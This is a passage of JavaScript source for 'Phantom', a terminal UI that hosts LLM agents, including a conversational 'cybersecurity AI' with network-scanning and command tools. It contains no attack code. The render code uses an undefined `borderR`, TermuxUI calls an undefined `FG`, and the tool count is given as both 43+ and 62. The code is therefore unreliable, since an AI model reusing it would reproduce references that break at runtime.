      dim: 60, border: 61, borderFocus: 99, titleBg: 17, panelBg: 16,
    };
    const fg = (name) => `\x1b[38;5;${map256[name] || 188}m`;
    const bg = (name) => `\x1b[48;5;${map256[name] || 16}m`;
    const fgrgb = () => "";
    const bgrgb = () => "";
    return { fg, bg, fgrgb, bgrgb, reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m", uline: "\x1b[4m" };
  }

  // True color
  const col = { bg: [10,10,26], fg: [192,192,224], green: [0,255,136], cyan: [0,204,255],
    magenta: [255,0,204], yellow: [255,136,0], red: [255,34,68], dim: [51,51,85],
    border: [68,68,170], borderFocus: [136,68,255], titleBg: [26,26,58], panelBg: [13,13,36] };
  const fg = (name) => `\x1b[38;2;${col[name].join(";")}m`;
  const bg = (name) => `\x1b[48;2;${col[name].join(";")}m`;
  const fgrgb = (r,g,b) => `\x1b[38;2;${r};${g};${b}m`;
  const bgrgb = (r,g,b) => `\x1b[48;2;${r};${g};${b}m`;
  return { fg, bg, fgrgb, bgrgb, reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m", uline: "\x1b[4m" };
})();

const R = ansi.reset, B = ansi.bold, D = ansi.dim;
const c = (name) => ansi.fg(name);
const agentFg = (ac) => ENV.hasTrueColor ? `\x1b[38;2;${ac[0]};${ac[1]};${ac[2]}m` :
                         ENV.has256 ? `\x1b[38;5;${16 + (ac[0]*6/256|0)*36 + (ac[1]*6/256|0)*6 + (ac[2]*6/256|0)}m` :
                         "";
const BG = (name) => ansi.bg(name);
const at = (c, r) => `\x1b[${r};${c}H`;
const cls = "\x1b[2J";
const home = "\x1b[H";
const hide = "\x1b[?25l";
const show = "\x1b[?25h";
const mono = !ENV.has256;

// Terminal raw mode helpers
let rawMode = false;
function raw(on) {
  if (on && !rawMode && process.stdin.isTTY) {
    try { process.stdin.setRawMode(true); rawMode = true; } catch {}
  } else if (!on && rawMode) {
    try { process.stdin.setRawMode(false); rawMode = false; } catch {}
  }
}

function getSize() {
  try {
    if (process.stdout.getWindowSize) {
      const [c, r] = process.stdout.getWindowSize();
      return { cols: Math.max(c, 20), rows: Math.max(r, 10) };
    }
  } catch {}
  return { cols: ENV.cols || 80, rows: ENV.rows || 24 };
}

// ── Desktop Mode ──────────────────────────────────────────
class DesktopUI {
  constructor(am) {
    this.am = am;
    this.bus = EventBus.i;
    this.logs = new Map(); // agentId -> string[]
    this.globalLog = [];
    this.focused = 0;
    this.panelOrder = [];
    this.cmdMode = false;
    this.cmdBuf = "";
    this.running = true;

    this.bus.on("agent:spawned", (a) => {
      this.panelOrder.push(a.id);
      if (!this.logs.has(a.id)) this.logs.set(a.id, []);
      this.log(a.id, `${c("green")}◈${R} ${B}${a.name}${R} spawned [${D}${a.role}${R}]`);
      this.render();
    });

    this.bus.on("agent:msg", ({ agent, text }) => {
      this.log(agent.id, `${agentFg(agent.color)}${agent.name}${R} ${D}»${R} ${text}`);
      this.render();
    });

    this.bus.on("agent:evolved", ({ agent, level }) => {
      this.log(agent.id, `${c("magenta")}⬆${R} ${B}${agent.name}${R} → level ${level}`);
      this.render();
    });

    this.bus.on("agent:removed", (id) => {
      this.panelOrder = this.panelOrder.filter(p => p !== id);
      if (this.focused >= this.panelOrder.length) this.focused = Math.max(0, this.panelOrder.length - 1);
      this.logAll(`${c("red")}✕${R} Agent ${D}${id}${R} removed`);
      this.render();
    });

    this.bus.on("tick", () => this.render());
  }

  log(id, msg) {
    if (!this.logs.has(id)) this.logs.set(id, []);
    this.logs.get(id).push(msg);
    if (this.logs.get(id).length > 200) this.logs.get(id).shift();
  }

  logAll(msg) {
    this.panelOrder.forEach(id => this.log(id, msg));
  }

  getPanelCount() {
    return Math.max(1, this.panelOrder.length);
  }

  getLayout() {
    const n = this.getPanelCount();
    const cols = Math.ceil(Math.sqrt(n));
    const rows = Math.ceil(n / cols);
    return { cols, rows };
  }

  render() {
    if (!this.running) return;
    const { cols: termW, rows: termH } = getSize();
    if (termH < 6 || termW < 20) return;

    const headerH = 1;
    const footerH = 1;
    const cmdH = this.cmdMode ? 1 : 0;
    const contentH = termH - headerH - footerH - cmdH;
    if (contentH < 1) return;

    const { cols: gridCols, rows: gridRows } = this.getLayout();
    const pW = Math.floor(termW / gridCols);
    const pH = Math.floor(contentH / gridRows);

    let out = cls + home + hide;

    // ── Header ──
    const agents = this.am.list;
    const thinking = agents.filter(a => a.status === "thinking").length;
    const statusStr = thinking > 0 ? `${c("yellow")}🧠 ${thinking} thinking${R}` : `${c("green")}⚡ idle${R}`;
    out += `${BG("titleBg")}${c("green")}${B} PHANTOM${R}${BG("titleBg")} ${D}space evolving terminal${R}${BG("titleBg")} ${D}|${R}${BG("titleBg")} agents: ${agents.length} ${D}|${R}${BG("titleBg")} ${statusStr}${R}`;
    out += " ".repeat(Math.max(0, termW - 60)) + "\n";

    // ── Panels ──
    for (let i = 0; i < this.panelOrder.length && i < gridCols * gridRows; i++) {
      const id = this.panelOrder[i];
      const agent = this.am.agents.get(id);
      const col = i % gridCols;
      const row = Math.floor(i / gridCols);
      const x = col * pW + 1;
      const y = row * pH + headerH + 1;
      const isFocused = i === this.focused;
      const borderFg = isFocused ? ansi.fg("borderFocus") : ansi.fg("border");

      // top border
      out += `${at(x, y)}${borderR}┌${borderR}${"─".repeat(Math.max(0, pW - 2))}${borderR}┐${R}`;

      if (agent) {
        const label = ` ${B}${agent.name}${R} ${D}[${agent.role}]${R} `;
        const labelLen = agent.name.length + agent.role.length + 5;
        const labelX = x + 2;
        if (labelX + labelLen < x + pW - 2) {
          out += `${at(labelX, y)}${label}`;
        }
      }

      // body
      const logs = this.logs.get(id) || [];
      const bodyH = pH - 2;
      const start = Math.max(0, logs.length - bodyH);
      for (let l = 0; l < bodyH; l++) {
        const ly = y + 1 + l;
        if (ly >= termH) break;
        out += `${at(x, ly)}${borderR}${R}${BG("panelBg")} ${R}`;
        const logIdx = start + l;
        if (logIdx < logs.length) {
          let line = logs[logIdx];
          const maxW = pW - 3;
          if (line.length > maxW) line = line.substring(0, maxW - 1) + "…";
          out += `${BG("panelBg")}${line}${R}`;
        }
        out += " ".repeat(Math.max(0, pW - 2));
        out += `${at(x + pW - 1, ly)}${borderR}${R}`;
      }

      // bottom border
      const by = y + bodyH + 1;
      if (by < termH) {
        out += `${at(x, by)}${borderR}└${"─".repeat(Math.max(0, pW - 2))}┘${R}`;
      }

      // agent status indicator
      if (agent) {
        const statusDot = agent.status === "thinking" ? `${c("yellow")}●${R}` :
                          agent.status === "speaking" ? `${c("green")}●${R}` :
                          `${D}○${R}`;
        const statusX = x + pW - 3;
        out += `${at(statusX, y)}${statusDot}`;
      }
    }

    // ── Command line ──
    if (this.cmdMode) {
      const cmdY = termH - 1;
      out += `${at(1, cmdY)}${BG("bg")}${c("cyan")}⚡${R} ${this.cmdBuf}${R}`;
      out += " ".repeat(Math.max(0, termW - this.cmdBuf.length - 3));
    } else {
      const footerY = termH;
      out += `${at(1, footerY)}${BG("titleBg")}${D}ESC cmd  TAB focus  →← panels  SPC agents  q quit${R}`;
    }

    process.stdout.write(out);
  }

  async handleCommand(cmd) {
    const parts = cmd.trim().split(/\s+/);
    const op = parts[0]?.toLowerCase();
    const args = parts.slice(1);

    switch (op) {
      case "spawn":
      case "s": this.am.spawn(args[0], args[1], args.slice(2).join(" ")); break;
      case "list":
      case "ls": {
        const il = this.am.list;
        const msg = `Agents: ${il.map(a => `${a.name}(${a.id})[${a.evolutionLevel}★]`).join(", ")}`;
        this.focused < this.panelOrder.length && this.log(this.panelOrder[this.focused], `${c("cyan")}◈${R} ${msg}`);
        break;
      }
      case "broadcast":
      case "b": {
        const t = args.join(" ");
        if (t && this.focused < this.panelOrder.length) this.am.broadcast(this.panelOrder[this.focused], t);
        break;
      }
      case "debate":
      case "d": this.am.debate(args.join(" ") || "what should we build?"); break;
      case "evolve":
      case "e": this.am.evolveAll(); this.logAll(`${c("magenta")}⬆ Mass evolution${R}`); break;
      case "clear":
      case "c": this.logs.forEach((_, k) => this.logs.set(k, [])); break;
      case "kill": {
        const target = args[0];
        const agent = this.am.list.find(a => a.name === target || a.id === target);
        if (agent) this.am.remove(agent.id);
        break;
      }
      case "help":
      case "h": {
        const helpText = [
          `${B}COMMANDS${R}`,
          `  ${c("green")}spawn${R} [name] [role] [persona]  ${D}create agent${R}`,
          `  ${c("green")}list${R}                          ${D}list agents${R}`,
          `  ${c("green")}broadcast${R} <msg>               ${D}message all agents${R}`,
          `  ${c("green")}debate${R} [topic]                ${D}agents debate${R}`,
          `  ${c("green")}evolve${R}                        ${D}evolve all agents${R}`,
          `  ${c("green")}kill${R} <name|id>               ${D}remove agent${R}`,
          `  ${c("green")}clear${R}                         ${D}clear panels${R}`,
          `  ${c("green")}quit${R}                          ${D}exit${R}`,
        ].join("\n");
        if (this.focused < this.panelOrder.length) {
          helpText.split("\n").forEach(line => this.log(this.panelOrder[this.focused], line));
        }
        break;
      }
      case "quit":
      case "q": this.stop(); break;
      default:
        if (this.focused < this.panelOrder.length)
          this.log(this.panelOrder[this.focused], `${c("red")}?${R} unknown: ${cmd}`);
    }
    this.render();
  }

  stop() {
    this.running = false;
    raw(false);
    process.stdout.write(cls + home + show);
    console.log(`${c("green")}Phantom terminated.${R}`);
    process.exit(0);
  }

  start() {
    this.am.spawnDefaults();

    const hasLLM = this.am.llm?.hasLLM;
    if (!hasLLM) {
      const msg = `${c("yellow")}⚠${R} No LLM configured. Use @llm_config to set up.`;
      setTimeout(() => {
        this.panelOrder.forEach(id => this.log(id, msg));
        this.render();
      }, 200);
    }

    this.render();
    raw(true);
    this.setupKeys();
  }

  setupKeys() {
    if (!process.stdin.isTTY) return;
    process.stdin.on("data", (buf) => {
      if (!this.running) return;
      const str = buf.toString();
      const { cols, rows } = getSize();

      if (this.cmdMode) {
        if (str === "\x1b" || str === "\x1b[A") { this.cmdMode = false; this.cmdBuf = ""; this.render(); return; }
        if (str === "\r" || str === "\n") {
          this.cmdMode = false;
          const cmd = this.cmdBuf;
          this.cmdBuf = "";
          this.render();
          this.handleCommand(cmd);
          return;
        }
        if (str === "\x7f" || str === "\b") {
          this.cmdBuf = this.cmdBuf.slice(0, -1);
          this.render();
          return;
        }
        if (str.length === 1 && str.charCodeAt(0) >= 32) {
          this.cmdBuf += str;
          this.render();
          return;
        }
        return;
      }

      // Not in command mode
      if (str === "\x1b") { this.cmdMode = true; this.cmdBuf = ""; this.render(); return; }
      if (str === "q" || str === "\x03") { this.stop(); return; }
      if (str === "\t") {
        const n = this.getPanelCount();
        this.focused = (this.focused + 1) % n;
        this.render();
        return;
      }
      // arrow keys
      if (str === "\x1b[C" || str === "\x1bOC") { // right
        const n = this.getPanelCount();
        this.focused = (this.focused + 1) % n;
        this.render();
        return;
      }
      if (str === "\x1b[D" || str === "\x1bOD") { // left
        const n = this.getPanelCount();
        this.focused = (this.focused - 1 + n) % n;
        this.render();
        return;
      }
      if (str === " ") {
        const n = this.getPanelCount();
        this.focused = (this.focused + 1) % n;
        this.render();
        return;
      }
    });
  }
}

// ── UI: Termux (readline-based) ───────────────────────────
class TermuxUI {
  constructor(am) {
    this.am = am;
    this.bus = EventBus.i;
    this.log = [];
    this.running = true;
    this.rl = null;

    this.bus.on("agent:spawned", (a) => {
      this.w(`${c("green")}◈${R} ${FG(...a.color)}${B}${a.name}${R} spawned [${D}${a.role}${R}]`);
      this.draw();
    });
    this.bus.on("agent:msg", ({ agent, text }) => {
      this.w(`${agentFg(agent.color)}${agent.name}${R} ${D}»${R} ${text}`);
      this.draw();
    });
    this.bus.on("agent:evolved", ({ agent, level }) => {
      this.w(`${c("magenta")}⬆${R} ${B}${agent.name}${R} → level ${level}`);
      this.draw();
    });
    this.bus.on("agent:removed", (id) => {
      this.w(`${c("red")}✕${R} Agent ${D}${id}${R} removed`);
      this.draw();
    });
  }

  w(msg) { this.log.push(msg); if (this.log.length > 200) this.log.shift(); }

  draw() {
    if (!this.running) return;
    const { rows } = getSize();
    const lines = this.log.slice(-(rows - 4));
    process.stdout.write(home + cls);
    lines.forEach(l => process.stdout.write(l + "\n"));
  }

  async handleCommand(cmd) {
    const parts = cmd.trim().split(/\s+/);
    const op = parts[0]?.toLowerCase();
    const args = parts.slice(1);

    switch (op) {
      case "spawn": case "s": this.am.spawn(args[0], args[1], args.slice(2).join(" ")); break;
      case "list": case "ls": {
        this.w(`${c("cyan")}◈${R} Agents: ${this.am.list.map(a => `${a.name}(${a.id}) ★${a.evolutionLevel}`).join(", ")}`);
        break;
      }
      case "broadcast": case "b": {
        const f = this.am.list[0]?.id;
        if (f) this.am.broadcast(f, args.join(" "));
        break;
      }
      case "debate": case "d": this.am.debate(args.join(" ") || "what should we build?"); break;
      case "evolve": case "e": this.am.evolveAll(); this.w(`${c("magenta")}⬆ Mass evolution${R}`); break;
      case "clear": case "c": this.log = []; break;
      case "help": case "h": {
        this.w(`${B}COMMANDS${R}`);
        this.w(`  ${c("green")}spawn${R} [name] [role] [persona]`);
        this.w(`  ${c("green")}list${R}                          ${D}list agents${R}`);
        this.w(`  ${c("green")}broadcast${R} <msg>               ${D}message all${R}`);
        this.w(`  ${c("green")}debate${R} [topic]                ${D}agents debate${R}`);
        this.w(`  ${c("green")}evolve${R}                        ${D}evolve all${R}`);
        this.w(`  ${c("green")}kill${R} <name|id>               ${D}remove agent${R}`);
        this.w(`  ${c("green")}clear${R}                         ${D}clear screen${R}`);
        this.w(`  ${c("green")}quit${R}                          ${D}exit${R}`);
        break;
      }
      case "kill": {
        const t = args[0];
        const a = this.am.list.find(x => x.name === t || x.id === t);
        if (a) this.am.remove(a.id);
        break;
      }
      case "quit": case "q": this.stop(); return;
    }
    this.draw();
    this.prompt();
  }

  prompt() {
    if (!this.running) return;
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: true });
    rl.question(`${c("cyan")}⚡${R} `, (ans) => {
      rl.close();
      if (ans.trim()) this.handleCommand(ans.trim());
      else { this.draw(); this.prompt(); }
    });
  }

  stop() {
    this.running = false;
    console.log(`\n${c("green")}Phantom terminated.${R}`);
    process.exit(0);
  }

  start() {
    process.stdout.write(cls + home);
    console.log(`${B}${c("green")}╔══════════════════════════════════════╗${R}`);
    console.log(`${B}${c("green")}║${R}  ${B}PHANTOM${R} ${D}space evolving terminal${R}  ${B}${c("green")}║${R}`);
    console.log(`${B}${c("green")}╚══════════════════════════════════════╝${R}\n`);

    this.am.spawnDefaults();

    if (!this.am.llm?.hasLLM) {
      this.w(`${c("yellow")}⚠${R} No LLM. Set ${B}OPENAI_API_KEY${R} env var for AI responses.`);
    }

    this.draw();
    this.prompt();
  }
}

// ── UI: Minimal (for tiny screens, CI, pipes) ─────────────
class MinimalUI {
  constructor(am) {
    this.am = am;
    this.bus = EventBus.i;
    this.log = [];
    this.running = true;
    this.bus.on("agent:msg", ({ agent, text }) => {
      this.w(`${agentFg(agent.color)}${agent.name}${R} » ${text}`);
      this.flush();
    });
    this.bus.on("agent:spawned", (a) => {
      this.w(`${a.name} spawned [${a.role}]`);
      this.flush();
    });
    this.bus.on("agent:evolved", ({ agent, level }) => {
      this.w(`${agent.name} → level ${level}`);
      this.flush();
    });
    this.bus.on("agent:removed", (id) => {
      this.w(`Agent ${id} removed`);
      this.flush();
    });
  }
  w(msg) { this.log.push(msg); if (this.log.length > 100) this.log.shift(); }
  flush() { if (this.log.length > 0) console.log(this.log[this.log.length - 1]); }
  start() {
    console.log(`  ${c("cyan")}${B}👻  PHANTOM${R}`);
    console.log(`  ${c("dim")}non-interactive mode${R}`);
    this.am.spawnDefaults();
    if (!this.am.llm?.hasLLM) console.log(`${D}No LLM. Use @llm_config to set up a provider.${R}`);
    if (!ENV.interactive) {
      // Non-interactive: just output and wait a bit then exit
      setTimeout(() => process.exit(0), 2000);
    } else {
      this.prompt();
    }
  }
  prompt() {
    if (!this.running) return;
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: true });
    rl.question(`${c("cyan")}⚡${R} `, (ans) => {
      rl.close();
      if (ans.trim()) this.handleCommand(ans.trim());
      else this.prompt();
    });
  }
  handleCommand(cmd) {
    const p = cmd.trim().split(/\s+/);
    const op = p[0]?.toLowerCase(), args = p.slice(1);
    switch (op) {
      case "spawn": case "s": this.am.spawn(args[0], args[1], args.slice(2).join(" ")); break;
      case "list": case "ls": console.log(`Agents: ${this.am.list.map(a => `${a.name}[${this.am.agents.get(a.id).status}]`).join(", ")}`); break;
      case "broadcast": case "b": { const f = this.am.list[0]?.id; if (f) this.am.broadcast(f, args.join(" ")); break; }
      case "debate": case "d": this.am.debate(args.join(" ") || "what should we build?"); break;
      case "evolve": case "e": this.am.evolveAll(); break;
      case "clear": case "c": this.log = []; break;
      case "quit": case "q": this.running = false; console.log("Bye."); process.exit(0);
      default: console.log(`? ${cmd}`);
    }
    if (this.running) this.prompt();
  }
}

// ── UI: Conversational REPL (Claude Code / Hermes style) ──
class ConversationalUI {
  constructor(am) {
    this.am = am;
    this.bus = EventBus.i;
    this.llm = am.llm;
    this.running = true;
    this.agent = null;
    this.conversation = [];
    this.logLines = [];
    this.inputBuf = "";
    this.inputHistory = [];
    this.historyIdx = 0;
    this.cursorPos = 0;
    this.inputLines = [];
    this.inputHandler = null;
  }

  log(msg) { this.logLines.push(msg); if (this.logLines.length > 1000) this.logLines.shift(); }

  formatToolResult(name, result) {
    const lines = (result || "").split("\n").filter(l => l.trim());
    if (lines.length <= 4) return lines.map(l => `  ${c("dim")}→ ${l}${R}`).join("\n");
    return lines.slice(0, 4).map(l => `  ${c("dim")}→ ${l.substring(0, 120)}${R}`).join("\n") +
      `\n  ${c("dim")}… +${lines.length - 4} more lines${R}`;
  }

  renderResponse(response) {
    if (!response) return;
    const lines = response.split("\n");
    let inCode = false;
    let codeLang = "";

    for (const line of lines) {
      const trimmed = line.trimEnd();
      const codeFence = trimmed.match(/^```(\w*)/);
      if (codeFence) {
        if (inCode) {
          this.log(`${c("dim")}└─${R}`);
          inCode = false;
        } else {
          codeLang = codeFence[1] || "code";
          this.log(`${c("dim")}┌─ ${c("yellow")}${codeLang}${R}`);
          inCode = true;
        }
        continue;
      }
      if (inCode) {
        this.log(`${c("dim")}│ ${R}${trimmed}`);
        continue;
      }
      // Tool calls
      if (trimmed.startsWith("@") && trimmed.length < 80) {
        this.log(`${c("magenta")}⚡ ${trimmed}${R}`);
        continue;
      }
      // Empty lines
      if (trimmed === "") {
        this.log("");
        continue;
      }
      this.log(`${c("fg")}${trimmed}${R}`);
    }
    if (inCode) this.log(`${c("dim")}└─${R}`);
  }

  async start() {
    process.stdout.write(cls + home);
    console.log(`\n${c("cyan")}${B}  👻  PHANTOM${R}`);
    console.log(`  ${c("green")}${B}━━━━━━━━━━━━━${R}`);
    console.log(`  ${c("dim")}cybersecurity AI · 62 tools${R}`);

    // Spawn single agent
    if (this.am.count === 0) {
      this.am.spawn("Phantom", "Cybersecurity AI",
        "You are Phantom, an elite cybersecurity AI assistant with full system access via 43+ integrated tools. " +
        "You operate in a conversational REPL — the user types natural language and you respond with analysis, " +
        "commands, code, and results. Use the @tool|args syntax to run any tool when needed. Be concise, " +
        "actionable, and thorough. Always explain your reasoning before running tools. " +
        "You can read, write, and edit files, run commands, scan networks, and perform security assessments."
      );
    }
    this.agent = this.am.list[0];

    if (this.llm?.hasLLM) {
      const providerName = typeof this.llm.provider === "string" ? this.llm.provider : "connected";
      this.log(`${c("green")}✓${R} ${B}Phantom${R} ${c("dim")}— ${providerName}${R}`);

      // Show available providers
      const ready = process.env.PHANTOM_PROVIDERS_READY;
      if (ready) {
        const list = ready.split(",").filter(n => n !== providerName);
        if (list.length > 0) {
          this.log(`  ${c("dim")}also ready: ${list.join(", ")} · /model to switch${R}`);
        }
      }
    } else {
      this.log(`${c("yellow")}⚠${R} No LLM configured.`);

      const ready = process.env.PHANTOM_PROVIDERS_READY;
      if (ready) {
        const list = ready.split(",");
        this.log(`  ${c("dim")}Available: ${list.join(", ")} · /model to select one${R}`);
      } else {
        this.log(`  ${c("dim")}Set OPENAI_API_KEY, ANTHROPIC_API_KEY, or run Ollama locally${R}`);
        this.log(`  ${c("dim")}tools-only mode (no AI reasoning)${R}`);
      }
    }
    this.log(`  ${c("dim")}62 tools · /help · \\\\ multi-line${R}`);
    this.log("");

    this.prompt();
  }

  prompt() {
    if (!this.running) return;
    this.inputBuf = "";
    this.historyIdx = this.inputHistory.length;
    this.cursorPos = 0;
    this.inputLines = [];

    process.stdout.write(`\n${c("green")}👻${R} `);

    raw(true);
    this.inputHandler = (buf) => this.onKey(buf);
    process.stdin.on("data", this.inputHandler);
  }

  onKey(buf) {
    if (!this.running) return;
    const str = buf.toString();

    // Up / Down arrows — history navigation
    if (str === "\x1b[A") {
      if (this.historyIdx > 0) {
        this.historyIdx--;
        this.inputBuf = this.inputHistory[this.historyIdx] || "";
        this.cursorPos = this.inputBuf.length;
      }
      this.redrawLine();
      return;
    }
    if (str === "\x1b[B") {
      if (this.historyIdx < this.inputHistory.length - 1) {
        this.historyIdx++;
        this.inputBuf = this.inputHistory[this.historyIdx] || "";
      } else {
        this.historyIdx = this.inputHistory.length;
        this.inputBuf = "";
      }
      this.cursorPos = this.inputBuf.length;
      this.redrawLine();
      return;
    }

    // Left / Right
    if (str === "\x1b[D") { this.cursorPos = Math.max(0, this.cursorPos - 1); this.redrawLine(); return; }
    if (str === "\x1b[C") { this.cursorPos = Math.min(this.inputBuf.length, this.cursorPos + 1); this.redrawLine(); return; }

    // Home / End
    if (str === "\x1b[H" || str === "\x01") { this.cursorPos = 0; this.redrawLine(); return; }
    if (str === "\x1b[F" || str === "\x05") { this.cursorPos = this.inputBuf.length; this.redrawLine(); return; }

    // Delete
    if (str === "\x1b[3~") {
      if (this.cursorPos < this.inputBuf.length) {
        this.inputBuf = this.inputBuf.slice(0, this.cursorPos) + this.inputBuf.slice(this.cursorPos + 1);
        this.redrawLine();
      }
      return;
    }

    // Ctrl+C / Ctrl+D
    if (str === "\x03") { raw(false); process.stdin.removeListener("data", this.inputHandler); this.stop(); return; }
    if (str === "\x04") {
      if (this.inputBuf.length === 0) { raw(false); process.stdin.removeListener("data", this.inputHandler); this.stop(); return; }
      return;
    }

    // Backspace
    if (str === "\x7f" || str === "\b") {
      if (this.cursorPos > 0) {
        this.inputBuf = this.inputBuf.slice(0, this.cursorPos - 1) + this.inputBuf.slice(this.cursorPos);
        this.cursorPos--;
        this.redrawLine();
      }
      return;
    }

    // Enter
    if (str === "\r" || str === "\n") {
      // Multi-line continuation
      if (this.inputBuf.endsWith("\\")) {
        this.inputLines.push(this.inputBuf.slice(0, -1));
        this.inputBuf = "";
        this.cursorPos = 0;
        process.stdout.write(`\n${c("green")}│${R} `);
        return;
      }

      const fullInput = this.inputLines.concat([this.inputBuf]).join("\n").trim();
      this.inputLines = [];
      this.inputBuf = "";
      this.cursorPos = 0;

      raw(false);
      process.stdin.removeListener("data", this.inputHandler);
      process.stdout.write("\n");

      if (fullInput) {
        if (this.inputHistory.length === 0 || this.inputHistory[this.inputHistory.length - 1] !== fullInput) {
          this.inputHistory.push(fullInput);
        }
        this.handleInput(fullInput);
      } else {
        this.prompt();
      }
      return;
    }

    // Regular character
    if (str.length === 1 && str.charCodeAt(0) >= 32) {
      this.inputBuf = this.inputBuf.slice(0, this.cursorPos) + str + this.inputBuf.slice(this.cursorPos);
      this.cursorPos++;
      this.redrawLine();
    }
  }

  redrawLine() {
    const prompt = this.inputLines.length > 0 ? `${c("green")}│${R} ` : `${c("green")}👻${R} `;
    const strippedPrompt = prompt.replace(/\x1b\[[0-9;]*m/g, "");
    const display = strippedPrompt + this.inputBuf;

    // Clear line and rewrite
    process.stdout.write(`\r\x1b[K${prompt}${this.inputBuf}`);

    // Move cursor to correct position
    const curX = strippedPrompt.length + this.cursorPos;
    const move = display.length - curX;
    if (move > 0) process.stdout.write(`\r\x1b[${display.length}D` + "\x1b[" + (curX + 1) + "C");
    // Simpler: use absolute positioning from right
    // Just rewrite and position cursor
    const { cols } = getSize();
    const cursorVisualCol = (strippedPrompt.length + this.cursorPos) % cols;
    process.stdout.write(`\r\x1b[K${prompt}${this.inputBuf}`);
    if (this.cursorPos < this.inputBuf.length) {
      const offset = this.inputBuf.length - this.cursorPos + strippedPrompt.length;
      // Need to account for cursor not at end
      // Actually simpler: carriage return + move to right column
      const totalLen = (prompt.replace(/\x1b\[[0-9;]*m/g, "") + this.inputBuf).length;
      const targetCol = cursorVisualCol;
      process.stdout.write(`\r\x1b[${targetCol + 1}C`);
    }
  }

  async handleInput(input) {
    // Commands
    if (input.startsWith("/")) {
      this.handleCommand(input.slice(1).trim().split(/\s+/));
      return;
    }

    // Show user input in log
    this.sayLine(`┃ ${input}`, "green");

    if (!this.agent) {
      this.sayLine("✕ No agent available.", "red");
      this.prompt();
      return;
    }

    // Thinking indicator
    process.stdout.write(`${c("yellow")}🧠 thinking${R}\r`);

    try {
      const response = await new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
          try { this.bus.off("agent:msg", handler); } catch {}
          reject(new Error("LLM response timeout"));
        }, 90000);

        const handler = ({ agent: a, text }) => {
          if (a && a.id === this.agent.id) {
            clearTimeout(timeout);
            try { this.bus.off("agent:msg", handler); } catch {}
            resolve(text);
          }
        };
        this.bus.on("agent:msg", handler);

        // If no LLM, just list tools and return
        if (!this.llm?.hasLLM) {
          clearTimeout(timeout);
          const tools = Object.keys(this.agent.tools).sort();
          resolve(`No LLM connected — tools-only mode.\nAvailable tools: ${tools.join(", ")}\nUse @tool_name|args to run a tool.`);
          return;
        }

        this.agent.receive("user", input).catch(err => {
          clearTimeout(timeout);
          try { this.bus.off("agent:msg", handler); } catch {}
          reject(err);
        });
      });

      // Clear thinking
      process.stdout.write(`\r\x1b[K`);

      // Render the response with formatting
      this.renderResponse(response);

    } catch (err) {
      process.stdout.write(`\r\x1b[K`);
      this.sayLine(`✕ Error: ${err.message}`, "red");
    }

    this.prompt();
  }

  sayLine(text, color = "fg") {
    this.log(`${c(color)}${text}${R}`);
  }

  handleCommand(args) {
    const op = args[0]?.toLowerCase();
    const rest = args.slice(1);

    switch (op) {
      case "help":
      case "h":
        console.log(`\n${B}${c("green")}PHANTOM COMMANDS${R}`);
        console.log(`  ${c("green")}👻 /help${R}      — show this help`);
        console.log(`  ${c("green")}  /tools${R}      — list 62 tools`);
        console.log(`  ${c("green")}  /model${R}      — show/switch LLM`);
        console.log(`  ${c("green")}  /clear${R}      — clear screen`);
        console.log(`  ${c("green")}  /save${R} <n>   — save session`);
        console.log(`  ${c("green")}  /load${R} <n>   — load session`);
        console.log(`  ${c("green")}  /quit${R}       — exit\n`);
        console.log(`${D}Type anything to chat. Use \\ for multi-line.${R}`);
        console.log(`${D}The AI auto-uses tools via @tool_name|args syntax.${R}\n`);
        this.prompt();
        return;

      case "tools": {
        const names = Object.keys(hackerTools).sort();
        console.log(`\n${B}${c("green")}PHANTOM TOOLS (${names.length})${R}`);
        const cols = 4;
        for (let i = 0; i < names.length; i += cols) {
          const row = names.slice(i, i + cols);
          console.log(`  ${row.map(n => `${c("cyan")}${n.padEnd(20)}${R}`).join("")}`);
        }
        console.log("");
        this.prompt();
        return;
      }

      case "model":
        if (rest.length === 0) {
          const ready = process.env.PHANTOM_PROVIDERS_READY;
          const avail = ready ? ready.split(",") : [];
          console.log(`\n${B}Current:${R} ${this.llm?.provider || "none"}`);
          console.log(`${D}Available providers:${R}`);
          for (const p of this.llm?.providers || []) {
            const status = avail.includes(p) ? `${c("green")} ✅${R}` : `${c("dim")} —${R}`;
            console.log(`  ${p.padEnd(14)}${status}`);
          }
          console.log(`${D}/model <provider> to switch${R}\n`);
        } else if (this.llm?.providers?.includes(rest[0])) {
          this.llm.provider = rest[0];
          console.log(`\n${c("green")}✓${R} Switched to ${B}${rest[0]}${R}\n`);
        } else {
          console.log(`\n${c("red")}✕${R} Unknown: ${rest[0]}. Available: ${this.llm?.providers?.join(", ") || "none"}\n`);
        }
        this.prompt();
        return;

      case "clear":
      case "c":
        this.logLines = [];
        process.stdout.write(cls + home);
        console.log(`\n${c("cyan")}${B}  👻  P H A N T O M${R}  ${c("dim")}cleared${R}\n`);
        this.prompt();
        return;

      case "save":
        if (rest[0]) {
          saveMemory(`session_${rest[0]}`, this.conversation);
          console.log(`\n${c("green")}✓${R} Saved: ${B}${rest[0]}${R}\n`);
        }
        this.prompt();
        return;

      case "load":
        if (rest[0]) {
          const m = loadMemory(`session_${rest[0]}`);
          if (m?.length) {
            this.conversation = m;
            console.log(`\n${c("green")}✓${R} Loaded: ${B}${rest[0]}${R} (${m.length} messages)\n`);
          } else {
            console.log(`\n${c("red")}✕${R} Not found: ${rest[0]}\n`);
          }
        }
        this.prompt();
        return;

      case "quit":
      case "q":
      case "exit":
        this.stop();
        return;

      default:
        console.log(`\n${c("red")}✕${R} Unknown: /${op}. Type ${c("green")}/help${R}\n`);
        this.prompt();
    }
  }

  stop() {
    this.running = false;
    raw(false);
    try { if (this.inputHandler) process.stdin.removeListener("data", this.inputHandler); } catch {}
    process.stdout.write(show);
    console.log(`\n${c("green")}Phantom terminated.${R}`);
    process.exit(0);
  }
}

// ── UI Selector ───────────────────────────────────────────
function selectUI(am) {
  const e = ENV;

  // Show environment info
  const info = [];
  if (e.isTermux) info.push("Termux");
  if (e.isTmux) info.push("tmux");
  if (e.isWSL) info.push("WSL");
  if (e.isWindows) info.push("Windows");
  if (e.isProot) info.push("PRoot");
  if (info.length) console.error(`${D}${info.join("/")} mode${R}`);

  // Non-interactive: minimal
  if (!e.interactive) {
    console.error(`${D}Non-interactive mode${R}`);
    return new MinimalUI(am);
  }

  // Default: Conversational REPL (works everywhere)
  // This gives a Claude Code / Hermes CLI experience
